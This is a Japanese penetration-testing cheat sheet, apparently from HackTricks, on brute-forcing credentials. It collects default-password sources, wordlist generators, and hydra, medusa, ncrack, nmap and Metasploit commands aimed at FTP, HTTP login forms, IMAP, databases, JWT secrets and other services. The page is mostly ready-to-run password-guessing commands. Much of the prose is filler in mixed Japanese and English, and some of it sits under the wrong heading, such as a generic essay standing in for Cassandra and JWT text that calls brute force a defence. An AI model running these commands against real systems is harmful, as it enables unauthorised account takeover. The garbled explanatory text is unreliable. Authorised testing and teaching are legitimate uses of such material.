# ブルートフォース - チートシート

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか、またはHackTricksをPDFでダウンロードしたいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>

## デフォルトの資格情報

使用されている技術のデフォルトの資格情報をGoogleで検索するか、次のリンクを試してください：

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl is a tool used for generating custom wordlists by scraping websites or documents. It can be helpful in performing brute force attacks by creating wordlists based on the target's specific interests or preferences.

To use Cewl, you need to provide it with a starting URL or a file containing text. It will then crawl the website or analyze the document to extract words and phrases. By applying various filters and options, you can customize the wordlist generation process to suit your needs.

Cewl can be particularly useful when targeting individuals or organizations with specific interests or when trying to crack passwords based on personal information. By creating wordlists that are tailored to the target, you increase the chances of success in a brute force attack.

To run Cewl, you can use the following command:

```
cewl [options] <URL or file>
```

Some common options include:

- `-d`: Set the depth of the crawl (default is 2).
- `-m`: Set the minimum word length (default is 3).
- `-w`: Specify the output file for the wordlist.

Cewl is a powerful tool that can enhance the effectiveness of brute force attacks by generating targeted wordlists. However, it is important to use it responsibly and ethically, ensuring that you have proper authorization before conducting any penetration testing activities.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

被害者の情報（名前、日付など）に基づいてパスワードを生成します。
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wisterは、単語リスト生成ツールであり、特定のターゲットに関連する使用するためのユニークで理想的な単語リストを作成するために、与えられた単語から複数のバリエーションを作成することができます。
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### ワードリスト

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## サービス

サービス名でアルファベット順に並べられています。

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a protocol used by Apache Tomcat to communicate with web servers. It is similar to the HTTP protocol but is more efficient for handling Java-based applications.

A common attack method against AJP is brute force, where an attacker attempts to guess the username and password combination to gain unauthorized access to the server. Brute force attacks can be automated using tools like Hydra or Medusa, which systematically try different combinations until the correct one is found.

To protect against brute force attacks on AJP, it is important to use strong and unique passwords for all user accounts. Additionally, implementing account lockouts after a certain number of failed login attempts can help prevent unauthorized access.

Regularly monitoring server logs for any suspicious activity and promptly addressing any detected brute force attempts is also crucial for maintaining the security of AJP-enabled servers.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
# ブルートフォース攻撃

ブルートフォース攻撃は、暗号化されたデータを解読するために使用される一般的な攻撃手法です。この攻撃手法では、すべての可能な組み合わせを試し、正しいパスワードや鍵を見つけることを目指します。

## ブルートフォース攻撃の手法

ブルートフォース攻撃にはいくつかの手法があります。

1. 辞書攻撃: 事前に作成された辞書ファイルを使用して、一連の単語やフレーズを試します。一般的なパスワードや一般的なフレーズを使用している場合、この攻撃手法は効果的です。

2. 総当たり攻撃: すべての可能な組み合わせを順番に試します。この攻撃手法は非常に時間がかかるため、短いパスワードや単純な鍵の場合にのみ有効です。

3. ハイブリッド攻撃: 辞書攻撃と総当たり攻撃を組み合わせた攻撃手法です。まず辞書攻撃を試し、成功しない場合に総当たり攻撃に移ります。

## ブルートフォース攻撃のリソース

ブルートフォース攻撃を実行するためには、いくつかのリソースが必要です。

1. パフォーマンスの高いハードウェア: ブルートフォース攻撃は非常に計算量が多いため、高性能なハードウェアが必要です。

2. 辞書ファイル: ブルートフォース攻撃に使用する辞書ファイルは、一連の一般的な単語やフレーズを含んでいます。

3. ブルートフォース攻撃ツール: ブルートフォース攻撃を自動化するためのツールが必要です。これにより、大量の組み合わせを効率的に試すことができます。

## ブルートフォース攻撃の対策

ブルートフォース攻撃からデータを保護するためには、いくつかの対策を講じることが重要です。

1. 強力なパスワードポリシーの実施: パスワードは長く複雑であるべきです。また、定期的にパスワードを変更することも重要です。

2. ロックアウト機能の有効化: 一定回数の誤った試行後にアカウントをロックする機能を有効にすることで、ブルートフォース攻撃を防ぐことができます。

3. 二要素認証の使用: パスワードに加えて、追加の認証要素を使用することで、セキュリティを強化することができます。

4. ブルートフォース攻撃の検知と監視: ブルートフォース攻撃を検知し、適切な対策を講じるための監視システムを導入することが重要です。

以上がブルートフォース攻撃に関する基本的な情報です。これらの情報を活用して、データを保護するための適切な対策を講じることが重要です。
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
# CouchDB

CouchDBは、ドキュメント指向のデータベースであり、HTTPプロトコルを使用してデータにアクセスすることができます。CouchDBは、データベースのブルートフォース攻撃に対して脆弱性を持っていることが知られています。ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証情報を推測するために連続的に試行する攻撃手法です。

CouchDBのブルートフォース攻撃を防ぐためには、以下の方法があります。

1. 強力なパスワードの使用: CouchDBには、強力なパスワードを使用することが重要です。パスワードは、長さが十分であり、大文字と小文字、数字、特殊文字を組み合わせたものを選ぶべきです。

2. ログイン試行回数の制限: CouchDBには、ログイン試行回数を制限する機能があります。これにより、攻撃者が連続してパスワードを試行することを防ぐことができます。ログイン試行回数の制限は、CouchDBの設定ファイルで構成することができます。

3. IP制限: CouchDBには、特定のIPアドレスからのアクセスを制限する機能もあります。これにより、不正なアクセス元からのブルートフォース攻撃を防ぐことができます。IP制限は、CouchDBの設定ファイルで設定することができます。

これらの対策を実施することで、CouchDBのブルートフォース攻撃を防ぐことができます。ただし、常に最新のセキュリティパッチを適用し、セキュリティ意識を高めることも重要です。
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
# Docker レジストリ

Docker レジストリは、Docker イメージを保存および管理するための中央リポジトリです。Docker イメージは、アプリケーションやサービスのコンテナ化されたバージョンを表します。

Docker レジストリには、公開レジストリとプライベートレジストリの2つのタイプがあります。公開レジストリは、誰でもアクセスできる一般的なイメージのリポジトリです。一方、プライベートレジストリは、特定の組織やユーザーによって制御されるイメージのリポジトリです。

Docker レジストリへのアクセスを制限するために、認証やアクセス制御の仕組みを使用することができます。これにより、機密性の高いイメージを保護し、不正なアクセスから保護することができます。

Docker レジストリへの攻撃を防ぐために、強力なパスワードポリシーや二要素認証を使用することが重要です。また、ブルートフォース攻撃から保護するために、パスワードの複雑さを確保することも重要です。

Docker レジストリのセキュリティを向上させるためには、定期的な脆弱性スキャンやパッチ適用、ログの監視などのセキュリティ対策を実施することが推奨されます。
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch is a distributed, RESTful search and analytics engine built on top of Apache Lucene. It provides a scalable solution for storing, searching, and analyzing large volumes of data in real-time.

## Brute Force Attacks

Brute force attacks are a common method used by hackers to gain unauthorized access to Elasticsearch instances. In a brute force attack, the hacker systematically tries all possible combinations of usernames and passwords until the correct credentials are found.

To protect against brute force attacks, it is important to implement strong security measures, such as:

1. **Use strong passwords**: Ensure that all Elasticsearch user accounts have strong, unique passwords that are not easily guessable.

2. **Implement account lockouts**: Set up account lockouts after a certain number of failed login attempts. This can help prevent brute force attacks by temporarily locking out the attacker.

3. **Enable IP whitelisting**: Restrict access to Elasticsearch instances by allowing only trusted IP addresses to connect. This can help prevent unauthorized access from unknown sources.

4. **Monitor for suspicious activity**: Regularly monitor Elasticsearch logs for any signs of brute force attacks or unauthorized access attempts. Implementing a log monitoring system can help detect and respond to such incidents in a timely manner.

By following these security best practices, you can significantly reduce the risk of brute force attacks on your Elasticsearch instances.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
## FTP

FTP（File Transfer Protocol）は、ファイルをサーバーとクライアント間で転送するためのプロトコルです。FTPサーバーには、ファイルのアップロードやダウンロードを行うための認証情報が必要です。

ブルートフォース攻撃は、FTPサーバーへのアクセスを試みる際に使用される一般的な攻撃手法の1つです。この攻撃では、辞書やパスワードリストを使用して、可能なすべてのパスワードの組み合わせを試行します。攻撃者は、正しいパスワードを見つけるまで、繰り返しログイン試行を行います。

ブルートフォース攻撃は、パスワードが弱い場合に効果的ですが、強力なパスワードを使用している場合は成功する可能性が低くなります。また、攻撃者が大量のログイン試行を行うため、サーバーの負荷が増加する可能性があります。

FTPサーバーのセキュリティを向上させるためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実施する
- ログイン試行回数の制限を設定する
- IPアドレスベースのアクセス制御を実装する
- ログイン試行の監視とアラートシステムを導入する

FTPサーバーのセキュリティを確保するためには、ブルートフォース攻撃に対する防御策を適切に実施することが重要です。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### HTTPジェネリックブルート

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTPベーシック認証
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - ポストフォーム

Brute forcing a login form is a common technique used to gain unauthorized access to a web application. In this method, an attacker systematically tries different combinations of usernames and passwords until a successful login is achieved.

To perform a brute force attack on an HTTP POST form, the following steps can be followed:

1. Identify the login form: Inspect the HTML source code of the login page to locate the form element that accepts the username and password.

2. Prepare a wordlist: Create a list of possible usernames and passwords that will be used for the brute force attack. This list can be generated using common passwords, dictionary words, or custom combinations.

3. Automate the attack: Use a scripting language or a tool like Burp Suite to automate the process of sending POST requests to the login form. The script or tool should iterate through the wordlist, sending a request for each combination of username and password.

4. Handle response codes: Analyze the response codes received from the server after each request. A successful login attempt will typically result in a redirect or a specific response code indicating a successful authentication.

5. Implement rate limiting: To avoid detection and potential account lockouts, it is important to implement rate limiting in the brute force attack. This can be done by introducing delays between each request or by limiting the number of requests per minute.

6. Monitor and analyze logs: Keep track of the login attempts and monitor the server logs for any suspicious activity. This will help identify any successful login attempts or potential security breaches.

It is important to note that brute forcing a login form is a time-consuming process and may not always be successful. Additionally, it is illegal and unethical to perform brute force attacks without proper authorization.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
http**s**の場合は、「http-post-form」を「**https-post-form」に変更する必要があります。

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
IMAP (Internet Message Access Protocol) is a widely used protocol for email retrieval. It allows users to access their email messages on a remote mail server. IMAP supports both online and offline modes, allowing users to manage their email messages even when they are not connected to the server.

#### Brute Forcing IMAP Credentials

Brute forcing is a common technique used to gain unauthorized access to IMAP accounts. It involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found.

To perform a brute force attack on an IMAP server, you can use tools like Hydra or Medusa. These tools automate the process of trying different username and password combinations, making it easier to find the correct credentials.

Before launching a brute force attack, it is important to gather information about the target, such as the email address format and any known usernames. This information can help narrow down the list of possible usernames to try.

When attempting a brute force attack, it is crucial to use a strong password list that includes common passwords, dictionary words, and variations of known passwords. Additionally, it is recommended to use a tool that supports multi-threading, as this can significantly speed up the attack.

To avoid detection and mitigate the risk of being blocked by the server, it is advisable to set a delay between each login attempt. This delay should be long enough to avoid triggering any account lockout mechanisms but short enough to maintain a reasonable attack speed.

It is important to note that brute forcing is an illegal activity unless performed with proper authorization. Always ensure that you have the necessary permissions and legal rights before attempting any brute force attacks.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
IRC（Internet Relay Chat）は、インターネット上でリアルタイムのテキストベースのコミュニケーションを行うためのプロトコルです。IRCは、チャットルームと呼ばれるグループチャットや、個別のプライベートメッセージを通じてユーザー間でのコミュニケーションを可能にします。

IRCサーバーに接続するためには、IRCクライアントソフトウェアを使用します。一般的なIRCクライアントには、mIRC、HexChat、irssiなどがあります。IRCクライアントを使用すると、IRCサーバーに接続し、チャットルームに参加したり、他のユーザーとのプライベートメッセージを送受信したりすることができます。

IRCは、ユーザー名とパスワードを使用して認証することができます。一部のIRCサーバーでは、ブルートフォース攻撃を使用してパスワードを解読しようとする試みが行われることがあります。ブルートフォース攻撃は、すべての可能なパスワードの組み合わせを試し、正しいパスワードを見つけることを試みる方法です。

ブルートフォース攻撃を防ぐためには、強力なパスワードを使用することが重要です。また、アカウントロックアウトやログイン試行回数の制限などのセキュリティ対策も有効です。さらに、IRCサーバーの管理者は、不審なアクティビティを監視し、不正なログイン試行を検出するためのログやアラートシステムを設定することができます。

IRCサーバーのブルートフォース攻撃は、セキュリティ上の脆弱性となり得るため、適切な対策を講じることが重要です。
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI (Internet Small Computer System Interface) is a protocol that allows the transmission of SCSI commands over IP networks. It enables the use of storage devices over a network, making it possible to access remote storage resources as if they were local.

iSCSI uses the TCP/IP protocol suite to establish connections between the initiator (client) and the target (storage device). The initiator sends SCSI commands to the target, which processes them and returns the results.

Brute forcing iSCSI targets involves systematically trying different combinations of usernames and passwords to gain unauthorized access to the target. This technique can be used to exploit weak or default credentials and gain unauthorized access to sensitive data stored on the target.

To perform a brute force attack on an iSCSI target, you can use tools like Hydra or Medusa, which are capable of automating the process of trying different username and password combinations. These tools can be configured with a list of usernames and passwords to try, and they will systematically attempt each combination until a successful login is achieved.

It is important to note that brute forcing iSCSI targets is an unethical and illegal activity unless you have explicit permission from the target owner to perform such actions. Always ensure you are conducting penetration testing or security assessments within the boundaries of the law and with proper authorization.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
JWT（JSON Web Token）は、認証と情報の安全な伝送を可能にするための開放的な標準です。JWTは、JSON形式で情報をエンコードし、署名または暗号化してトークンとして使用します。JWTは、ユーザーの認証情報やクレーム（権限、ロールなど）を含むことができます。JWTは、クライアントとサーバー間での信頼性のある通信を確保するために使用されます。

JWTの攻撃に対する防御策として、ブルートフォース攻撃があります。ブルートフォース攻撃は、すべての可能な組み合わせを試行し、正しいトークンを見つけることを試みる攻撃です。この攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの複雑さを確保する必要があります。また、アカウントロックアウトやCAPTCHAなどのセキュリティメカニズムを導入することも有効です。

ブルートフォース攻撃を防ぐための他の方法として、トークンの有効期限を短くすることや、認証試行回数の制限を設けることも考えられます。さらに、セキュリティテストやペネトレーションテストを定期的に実施し、システムの脆弱性を特定し、修正することも重要です。

JWTのセキュリティを確保するためには、適切な暗号化アルゴリズムを使用し、署名キーを厳密に管理する必要があります。また、信頼できる認証局を使用して署名を検証することも重要です。

以上が、JWTに関する情報とブルートフォース攻撃に対する防御策です。
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
## LDAP

LDAP（Lightweight Directory Access Protocol）は、ディレクトリサービスにアクセスするためのプロトコルです。ディレクトリサービスは、ユーザー、グループ、コンピュータなどの情報を格納するために使用されます。LDAPは、ディレクトリサービスに対して検索、追加、変更、削除などの操作を行うための方法を提供します。

LDAPサーバーに対するブルートフォース攻撃は、一連のパスワードを試し、正しいパスワードを見つけることを目指します。これにより、攻撃者はLDAPサーバーに不正アクセスすることができます。

ブルートフォース攻撃は、一般的に辞書攻撃として知られています。攻撃者は、一連の一般的なパスワードや辞書に含まれる単語を試し、正しいパスワードを見つけることを試みます。攻撃者は、パスワードポリシーの弱さやユーザーの選択した弱いパスワードに依存しています。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、ユーザーに強力なパスワードの使用を促す必要があります。また、アカウントロックアウト機能を有効にすることも重要です。これにより、一定回数の誤ったパスワード試行後にアカウントがロックアウトされ、攻撃者の試行を制限することができます。

ブルートフォース攻撃を検出するためには、ログイン試行の異常な増加を監視する必要があります。また、IPアドレスやユーザーアカウントのブラックリストを作成し、不正なアクセスをブロックすることも有効です。

LDAPサーバーのセキュリティを強化するためには、最新のセキュリティパッチを適用し、不要なサービスやポートを無効化することが重要です。また、アクセス制御リスト（ACL）を使用して、不正なアクセスを制限することも推奨されます。

ブルートフォース攻撃は、セキュリティ上の脆弱性を悪用するため、LDAPサーバーのセキュリティを強化することは非常に重要です。
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT（Message Queuing Telemetry Transport）は、軽量なメッセージングプロトコルであり、IoT（Internet of Things）デバイス間の通信に広く使用されています。このプロトコルは、低帯域幅や不安定なネットワーク環境でも効率的に動作します。

MQTTは、パブリッシャーとサブスクライバーの2つの役割を持つクライアント間の非同期通信を可能にします。パブリッシャーはメッセージをトピックにパブリッシュし、サブスクライバーは特定のトピックにサブスクライブしてメッセージを受信します。

MQTTのセキュリティには注意が必要です。デフォルトの設定では、認証や暗号化が行われないため、攻撃者による盗聴や改ざんのリスクがあります。したがって、適切なセキュリティ対策を講じることが重要です。

MQTTのブルートフォース攻撃は、パスワードの推測に基づいて行われます。攻撃者は、一連のパスワードを試し、正しいパスワードを見つけることを目指します。この攻撃を防ぐためには、強力なパスワードポリシーを実装し、アカウントロックアウトやログイン試行回数の制限などのセキュリティメカニズムを使用することが重要です。

ブルートフォース攻撃を検出するためには、ログイン試行回数の異常な増加や異なるIPアドレスからのログイン試行などの異常なアクティビティを監視することが重要です。また、ログイン試行回数の制限やCAPTCHAの導入などの対策を講じることも有効です。

MQTTのセキュリティを強化するためには、TLS（Transport Layer Security）プロトコルを使用して通信を暗号化することが推奨されます。また、認証機構を導入し、信頼できるクライアントのみが接続できるようにすることも重要です。

以上がMQTTに関する概要です。セキュリティには十分な注意を払い、適切な対策を講じることが重要です。
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
# ブルートフォース攻撃

ブルートフォース攻撃は、Mongoデータベースに対して非常に効果的な攻撃手法です。この攻撃手法では、すべての可能なパスワードの組み合わせを試し、正しいパスワードを見つけることを目指します。

以下は、Mongoデータベースに対するブルートフォース攻撃の手順です。

1. ユーザー名のリストを取得します。
2. パスワードのリストを取得します。
3. ユーザー名とパスワードの組み合わせを作成します。
4. 作成した組み合わせを使用してMongoデータベースにログインを試みます。
5. 正しい組み合わせが見つかるまで、ステップ4を繰り返します。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、強力なパスワードを使用している場合には成功する可能性が低くなります。したがって、セキュリティを強化するためには、強力なパスワードポリシーを採用することが重要です。

また、ブルートフォース攻撃を防ぐためには、以下の対策を講じることが推奨されます。

- パスワードの複雑さを増す
- ログイン試行回数の制限を設定する
- 2要素認証を使用する

以上がMongoデータベースに対するブルートフォース攻撃に関する情報です。セキュリティを強化するためには、適切な対策を講じることが重要です。
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQLは、オープンソースのリレーショナルデータベース管理システムであり、多くのウェブアプリケーションやウェブサイトで使用されています。MySQLデータベースへの不正アクセスを試みる際に、ブルートフォース攻撃は一般的な手法の1つです。

ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードを推測するために連続的に試行する手法です。攻撃者は、一連のパスワードを自動的に生成し、それらを順番に試して、正しいパスワードを見つけることを目指します。

MySQLのブルートフォース攻撃では、一般的にユーザー名とパスワードの組み合わせを試行します。攻撃者は、一般的なユーザー名やパスワード、辞書攻撃、またはランダムな文字列を使用して攻撃を行います。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの複雑さを確保することが重要です。また、アカウントロックアウト機能やIP制限などのセキュリティメカニズムを使用することも有効です。

MySQLのブルートフォース攻撃を検出するためには、ログイン試行の異常な増加や特定のユーザー名/パスワードの連続試行などのパターンを監視することが重要です。また、侵入検知システムやログ監視ツールを使用することも推奨されます。

ブルートフォース攻撃は、時間とリソースがかかるため、強力なパスワードやセキュリティ対策があれば、成功する可能性は低くなります。したがって、MySQLデータベースのセキュリティを確保するためには、適切な対策を講じることが重要です。
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# Brute Force

Brute force is a common method used in penetration testing to crack passwords or encryption keys by systematically trying all possible combinations until the correct one is found. This technique is often used when other methods, such as dictionary attacks or rainbow table attacks, are not successful.

In the context of Oracle SQL, brute force can be used to gain unauthorized access to a database by guessing the username and password combination. This can be done by using automated tools or scripts that iterate through a list of commonly used usernames and passwords, or by manually trying different combinations.

To protect against brute force attacks, it is important to use strong and unique passwords, implement account lockout policies, and monitor for suspicious login attempts. Additionally, using two-factor authentication can add an extra layer of security by requiring a second form of verification, such as a code sent to a mobile device, in addition to the username and password.

While brute force attacks can be effective, they can also be time-consuming and resource-intensive. Therefore, it is important for organizations to regularly assess and strengthen their security measures to mitigate the risk of brute force attacks.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
**oracle_login**を**patator**と一緒に使用するためには、以下の手順で**インストール**する必要があります:
```bash
pip3 install cx_Oracle --upgrade
```
[オフラインOracleSQLハッシュブルートフォース](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**バージョン11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2**、および**11.2.0.3**)：
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
Brute force is a common method used in hacking to gain unauthorized access to a system or account by systematically trying all possible combinations of passwords until the correct one is found. This method is often used when there is no other known vulnerability or weakness in the system's security.

